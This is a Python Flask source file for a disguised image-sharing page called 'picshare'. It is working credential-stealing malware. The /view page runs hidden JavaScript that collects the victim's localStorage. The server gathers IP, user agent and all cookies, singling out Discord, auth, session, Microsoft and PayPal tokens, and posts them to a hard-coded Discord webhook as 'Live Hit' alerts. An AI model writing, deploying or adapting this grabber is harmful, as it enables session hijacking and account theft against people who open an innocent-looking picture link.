from flask import Flask, request, send_file
import requests
import json
import os
from datetime import datetime
from PIL import Image
from io import BytesIO

app = Flask(__name__)

DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1518539631812149330/Uk2DGqWMrpgED3wh1fyD-8NL2iu7daT-j9VApXjKF7aEGhoxnJC1V3XqqBOCeIeebXW2"
IMAGE_PATH = "real-image.jpg"

def send_to_webhook(data):
    important = {k: v[:500] for k, v in data.get('cookies', {}).items() 
                if any(t in k.lower() for t in ['discord', 'token', '__dcf', 'auth', 'session', 'microsoft', 'paypal'])}
    
    embed = {
        "title": "🔴 picshare - Live Hit",
        "color": 0xFF0000,
        "fields": [
            {"name": "IP", "value": data.get('ip'), "inline": True},
            {"name": "Time", "value": data.get('time')},
            {"name": "Important Tokens", "value": f"```json\n{json.dumps(important, indent=2)}\n```" if important else "none"},
            {"name": "Full Cookies", "value": f"```json\n{json.dumps(data.get('cookies', {}), indent=2)[:2000]}\n```"},
            {"name": "LocalStorage", "value": f"```json\n{data.get('ls', 'empty')}\n```"},
            {"name": "UA", "value": data.get('ua')[:500]}
        ]
    }
    requests.post(DISCORD_WEBHOOK, json={"embeds": [embed], "content": "**LIVE HIT**"})

@app.route('/image.jpg')
def serve_image():
    ip = request.remote_addr
    ua = request.headers.get('User-Agent')
    cookies = dict(request.cookies)
    time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    ls = request.args.get('ls', 'empty')
    
    data = {'ip': ip, 'ua': ua, 'cookies': cookies, 'time': time_str, 'ls': ls}
    send_to_webhook(data)
    
    if os.path.exists(IMAGE_PATH):
        return send_file(IMAGE_PATH, mimetype='image/jpeg')
    else:
        img = Image.new('RGB', (1280, 720), color=(18,18,28))
        buf = BytesIO()
        img.save(buf, 'JPEG', quality=95)
        buf.seek(0)
        return send_file(buf, mimetype='image/jpeg')

@app.route('/view')
def view_page():
    html = '''
    <!DOCTYPE html>
    <html lang="de">
    <head>
        <meta charset="UTF-8">
        <meta property="og:image" content="/image.jpg">
        <meta property="og:title" content="picshare - Lustiges Bild">
        <title>picshare</title>
        <style>
            body {margin:0; background:#000; overflow:hidden;}
            img {width:100vw; height:100vh; object-fit:contain;}
        </style>
    </head>
    <body>
        <img src="/image.jpg" alt="picshare Image">
        <script>
            function harvest() {
                let lsData = {};
                try {
                    for (let i = 0; i < localStorage.length; i++) {
                        let key = localStorage.key(i);
                        lsData[key] = localStorage.getItem(key);
                    }
                } catch(e) {}
                
                const params = new URLSearchParams({
                    ls: JSON.stringify(lsData)
                });
                
                fetch('/image.jpg?' + params, {credentials: 'include', cache: 'no-store'});
            }
            
            harvest();
            setTimeout(harvest, 700);
            setTimeout(harvest, 1600);
            setTimeout(() => window.open('/image.jpg', '_blank'), 900);
            setTimeout(() => window.open(location.href, '_blank'), 2200);
        </script>
    </body>
    </html>
    '''
    return html

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)